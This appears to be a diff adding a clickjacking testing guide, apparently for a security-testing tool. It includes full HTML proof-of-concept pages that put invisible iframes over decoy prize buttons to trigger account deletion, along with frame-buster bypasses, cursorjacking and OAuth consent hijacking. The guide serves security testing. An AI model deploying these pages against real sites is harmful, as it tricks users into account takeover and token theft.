@@ -1,0 +1,345 @@
+<clickjacking_vulnerability_guide>
+<title>CLICKJACKING (UI REDRESSING)</title>
+
+<critical>Clickjacking tricks users into clicking hidden UI elements by overlaying transparent iframes on attacker-controlled content. Despite being considered "low severity," it enables OAuth token theft, one-click account takeover, and CSRF bypass when combined with other vulnerabilities.</critical>
+
+<scope>
+- Web applications lacking X-Frame-Options or CSP frame-ancestors
+- Single-page applications with state-changing actions
+- OAuth authorization endpoints
+- Payment confirmation pages
+- Account settings (password change, email update, 2FA disable)
+- Admin panels and privileged actions
+- Social media interaction buttons (like, follow, share)
+</scope>
+
+<methodology>
+1. Check for X-Frame-Options and CSP frame-ancestors headers
+2. Attempt to iframe the target application
+3. Identify high-value clickable actions (buttons, links)
+4. Build PoC demonstrating realistic attack scenario
+5. Test across browsers (header handling varies)
+6. Consider multi-click and drag-and-drop variants
+</methodology>
+
+<high_value_targets>
+- OAuth authorization "Allow" buttons
+- "Delete Account" or "Disable 2FA" actions
+- Payment confirmation buttons
+- Admin privilege grant actions
+- API key/token generation buttons
+- Password/email change confirmations
+- Social actions (follow, endorse, approve)
+- One-click purchase buttons
+</high_value_targets>
+
+<discovery_techniques>
+<header_analysis>
+Check response headers:
+- X-Frame-Options: DENY (secure - blocks all framing)
+- X-Frame-Options: SAMEORIGIN (secure - allows same origin only)
+- X-Frame-Options: ALLOW-FROM uri (deprecated, limited browser support)
+- Content-Security-Policy: frame-ancestors 'none' (secure)
+- Content-Security-Policy: frame-ancestors 'self' (secure)
+- Content-Security-Policy: frame-ancestors https://trusted.com (conditional)
+
+Missing headers = potentially vulnerable
+</header_analysis>
+
+<framing_test>
+Basic iframe test:
+```html
+&lt;iframe src="https://target.com/sensitive-action" width="500" height="500"&gt;&lt;/iframe&gt;
+```
+
+If content loads, page is frameable.
+If blocked, check error:
+- "Refused to display in a frame" = X-Frame-Options working
+- Blank frame = CSP frame-ancestors working
+- Connection reset = JavaScript frame-busting (bypassable)
+</framing_test>
+
+<frame_buster_detection>
+JavaScript-based protections (often bypassable):
+- if (top !== self) top.location = self.location
+- if (parent.frames.length > 0) window.top.location = window.location
+- window.onbeforeunload to detect navigation
+
+Bypass detection:
+- sandbox="allow-scripts allow-forms" on iframe
+- Double-framing to confuse parent checks
+- History manipulation
+</frame_buster_detection>
+</discovery_techniques>
+
+<exploitation_techniques>
+<basic_overlay>
+```html
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;style&gt;
+  #target {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    opacity: 0.0001;
+    z-index: 2;
+  }
+  #decoy {
+    position: absolute;
+    top: 100px;
+    left: 200px;
+    z-index: 1;
+  }
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;button id="decoy"&gt;Click here to win a prize!&lt;/button&gt;
+&lt;iframe id="target" src="https://target.com/delete-account"&gt;&lt;/iframe&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+```
+</basic_overlay>
+
+<precise_positioning>
+Position iframe so target button aligns with decoy:
+```css
+#target {
+  position: absolute;
+  top: -300px;  /* Offset to align button */
+  left: -150px;
+  clip: rect(300px, 350px, 350px, 150px);  /* Show only button area */
+  opacity: 0.0001;
+}
+```
+</precise_positioning>
+
+<multi_click>
+Multi-step clickjacking:
+1. First click enables a feature
+2. Second click confirms action
+3. Use animation/game to guide multiple clicks
+
+Drag-and-drop jacking:
+- Use HTML5 drag events
+- Victim drags from one iframe to another
+- Text/data transferred contains malicious payload
+</multi_click>
+
+<text_injection>
+Likejacking with text fields:
+1. Victim types in visible text field
+2. Hidden iframe captures keystrokes
+3. Input sent to attacker-controlled field
+</text_injection>
+
+<cursor_manipulation>
+Cursorjacking:
+```css
+body { cursor: url('fake-cursor.png'), auto; }
+```
+- Hide real cursor with custom image
+- Display fake cursor offset from real position
+- Victim clicks where they think cursor is
+</cursor_manipulation>
+</exploitation_techniques>
+
+<oauth_exploitation>
+<oauth_clickjacking>
+Target OAuth authorization page:
+1. User is already authenticated to OAuth provider
+2. Attacker frames authorization endpoint with pre-filled params
+3. Victim clicks "Allow" thinking they're clicking something else
+4. Attacker's app receives authorization code/token
+
+High-value OAuth targets:
+- Authorization code grant flow
+- Implicit grant "Allow" button
+- Token refresh consent pages
+- App permission grant screens
+</oauth_clickjacking>
+
+<token_extraction>
+If OAuth callback can be framed:
+1. Frame callback URL
+2. Extract token from URL fragment or page content
+3. postMessage listener exploitation
+</token_extraction>
+</oauth_exploitation>
+
+<bypass_techniques>
+<frame_buster_bypass>
+Sandbox attribute:
+```html
+&lt;iframe sandbox="allow-scripts allow-forms" src="https://target.com"&gt;&lt;/iframe&gt;
+```
+- Blocks top-level navigation (frame-busting fails)
+- Still allows scripts and form submission
+
+Double framing:
+- Outer frame busts to inner frame
+- Inner frame still contains target
+- Some frame-busters only check immediate parent
+
+onBeforeUnload blocking:
+```javascript
+window.onbeforeunload = function() { return "Stay?"; }
+```
+</frame_buster_bypass>
+
+<header_bypass>
+X-Frame-Options bypass scenarios:
+- Header not set on all pages (only homepage protected)
+- ALLOW-FROM with attacker-controlled origin
+- Proxy stripping headers
+- CDN not forwarding headers
+
+CSP bypass:
+- Wildcard domains: frame-ancestors *.example.com (register subdomain)
+- Scheme mismatch: frame-ancestors http://example.com (use https)
+- Report-only mode: CSP-Report-Only (not enforced)
+</header_bypass>
+
+<partial_coverage>
+Pages without protection:
+- Error pages
+- Print/export views
+- Embedded widgets
+- PDF preview iframes
+- Legacy endpoints
+- Subdomains
+</partial_coverage>
+</bypass_techniques>
+
+<advanced_attacks>
+<combo_attacks>
+Clickjacking + XSS:
+- Click to execute XSS payload
+- Bypass XSS filters via UI interaction
+
+Clickjacking + CSRF:
+- Frame anti-CSRF token page
+- Click to submit token in form
+
+Clickjacking + OAuth:
+- Steal authorization codes
+- Force app authorization
+</combo_attacks>
+
+<browser_specific>
+Chrome:
+- Strict X-Frame-Options enforcement
+- CSP frame-ancestors supported
+
+Firefox:
+- Similar to Chrome
+- Some legacy quirks
+
+Safari:
+- Older versions have weaker enforcement
+- iOS Safari considerations
+
+Edge:
+- Modern Edge like Chrome
+- Legacy Edge had differences
+</browser_specific>
+</advanced_attacks>
+
+<poc_template>
+```html
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Claim Your Prize!&lt;/title&gt;
+&lt;style&gt;
+body {
+  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: sans-serif;
+}
+.container {
+  position: relative;
+  text-align: center;
+  color: white;
+}
+.decoy-button {
+  background: #00d4aa;
+  color: white;
+  padding: 20px 40px;
+  font-size: 24px;
+  border: none;
+  border-radius: 10px;
+  cursor: pointer;
+  position: relative;
+  z-index: 1;
+}
+#target-frame {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 200px;
+  height: 60px;
+  opacity: 0.0001;
+  z-index: 2;
+  border: none;
+}
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class="container"&gt;
+  &lt;h1&gt;Congratulations!&lt;/h1&gt;
+  &lt;p&gt;You've been selected for a special prize!&lt;/p&gt;
+  &lt;div style="position: relative; display: inline-block;"&gt;
+    &lt;button class="decoy-button"&gt;Claim Prize&lt;/button&gt;
+    &lt;iframe id="target-frame" src="https://vulnerable.com/settings/delete-account"&gt;&lt;/iframe&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+```
+</poc_template>
+
+<validation>
+1. Confirm target page can be framed (no X-Frame-Options or CSP)
+2. Demonstrate overlay positioning with visible iframe (opacity: 0.5)
+3. Show realistic attack scenario with decoy content
+4. Execute action (or simulate with reduced opacity to show button alignment)
+5. Document browser(s) tested and behavior
+</validation>
+
+<false_positives>
+- X-Frame-Options: DENY or SAMEORIGIN set correctly
+- CSP frame-ancestors 'none' or 'self' enforced
+- Pages with no state-changing actions
+- Public content meant to be embedded
+- Additional confirmation steps (CAPTCHAs, re-authentication)
+</false_positives>
+
+<impact>
+- One-click account takeover (delete, disable 2FA)
+- Unauthorized financial transactions
+- OAuth token theft
+- Social engineering amplification
+- Privacy violations (camera/microphone access grants)
+- Privilege escalation via tricked admin actions
+</impact>
+
+<pro_tips>
+1. Check subdomains and legacy endpoints - often unprotected.
+2. OAuth authorization pages are highest value - always test them.
+3. Use sandbox attribute to bypass JavaScript frame-busters.
+4. Multi-click attacks work better with games or reward mechanics.
+5. Mobile browsers have different touch event handling - test separately.
+6. Frame-ancestors CSP is more flexible than X-Frame-Options - check both.
+7. Combine with social engineering for realistic attack scenarios.
+</pro_tips>
+
+<remember>Clickjacking is about user interaction, not code execution. The vulnerability is the ability to frame; the exploit is social engineering the click. Focus on high-value one-click actions and realistic decoy scenarios that would trick real users.</remember>
+</clickjacking_vulnerability_guide>
+
